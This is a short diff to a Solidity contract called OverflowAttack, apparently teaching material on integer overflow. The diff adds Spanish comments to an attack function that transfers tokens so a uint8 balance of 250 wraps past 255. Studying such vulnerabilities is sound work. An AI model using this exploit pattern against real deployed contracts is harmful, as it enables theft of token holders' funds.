@@ -6,12 +6,15 @@ interface ITokenOverflow {
 }
 
 contract OverflowAttack {
+    // Variables    
     ITokenOverflow public target;
 
+    // Constructor
     constructor(address _target) {
         target = ITokenOverflow(_target);
     }
 
+    //Funcion de ataque
     function attack() public {
         // Intentamos transferir 10 tokens a un saldo ya situado en 250 (uint8 -> 255)
         target.transfer(msg.sender, 10);
